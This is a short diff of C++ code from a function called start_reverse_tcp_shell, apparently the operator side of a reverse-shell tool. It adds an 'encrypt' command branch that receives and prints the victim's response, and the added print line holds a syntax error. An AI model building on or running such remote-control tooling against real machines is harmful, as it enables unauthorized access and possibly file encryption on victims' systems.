@@ -150,6 +150,12 @@ void start_reverse_tcp_shell(client cli)
 			recv(cli.id, response, sizeof(response), 0);
 			cout << response << "\n";
 		}
+		else if (strncmp("encrypt", buffer, 7)==0){
+			recv(cli.id, response, sizeof(response),0);
+			cout << response <, "\n";
+
+		}
+		
 		else {	
 			while(strlen(response) == 0) {
 				recv(cli.id, response, sizeof(response), MSG_WAITALL);
